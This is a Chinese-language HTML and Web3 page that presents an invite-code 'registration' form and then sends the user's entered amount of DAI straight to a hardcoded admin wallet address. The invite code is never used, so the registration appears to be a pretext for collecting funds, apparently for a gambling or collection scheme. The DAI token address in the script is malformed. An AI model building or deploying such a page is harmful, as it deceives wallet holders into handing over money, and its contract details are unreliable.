<!DOCTYPE html>
<html lang="zh-CN">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DAI转入管理员（通用任何节点）</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,"Microsoft YaHei",sans-serif}
  body{background:#090b1a;color:#fff;padding:20px;max-width:500px;margin:0 auto}
  .glass{background:rgba(30,35,60,0.7);border-radius:18px;padding:20px;margin:16px 0}
  .btn{background:linear-gradient(90deg,#4facfe,#00F2FE);color:#000;border:none;border-radius:12px;padding:14px;width:100%;font-weight:bold;font-size:16px;margin-top:10px}
  input{width:100%;padding:14px;border-radius:12px;border:1px solid #fff3;background:#fff1;color:#fff;font-size:15px;}
</style>

<body>
<button class="btn" id="connectBtn">连接钱包</button>
<div id="addr" style="margin:12px 0;color:#aaa;"></div>

<div class="glass">
  <div class="title">注册并转入DAI</div>
  <input id="invite" placeholder="邀请码">
  <input id="amount" placeholder="数量" type="number">
  <button class="btn" id="transferBtn">确认提交</button>
</div>

<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
<script>
const ADMIN = "0xe6ac36fd161C390BEb9ffa3a96c895cdD037233a";
const DAI = "0x8f3Cf7ad23Cd3CaDbD9735AFf95802329c6A063";

let web3;
let account;

const ERC20_ABI = [
  {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"type":"bool"}],"stateMutability":"nonpayable"},
  {"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"type":"uint256"}]},
  {"constant":true,"inputs":[],"name":"decimals","outputs":[{"type":"uint8"}]}
];

// 连接钱包
document.getElementById("connectBtn").onclick = async () => {
  try {
    web3 = new Web3(window.ethereum);
    const accounts = await web3.eth.requestAccounts();
    account = accounts[0].toLowerCase();
    document.getElementById("addr").innerText = "已连接："+account;
  } catch(e) {
    alert("连接失败");
  }
};

// 直接转给管理员（和龙虎斗一样通用，不需要授权）
document.getElementById("transferBtn").onclick = async () => {
  if(!account) return alert("先连接钱包");
  const invite = document.getElementById("invite").value.trim();
  const val = document.getElementById("amount").value;
  if(!invite || !val) return alert("请填写完整");

  try {
    const token = new web3.eth.Contract(ERC20_ABI, DAI);
    const dec = await token.methods.decimals().call();
    const amount = web3.utils.toBN(val).mul(web3.utils.toBN(10**dec));

    // 直接转账，不需要授权！任何节点都能用
    await token.methods.transfer(ADMIN, amount).send({ from: account });

    alert("提交成功！");
  } catch(e) {
    alert("失败："+e.message);
  }
};
</script>
</body>
</html>
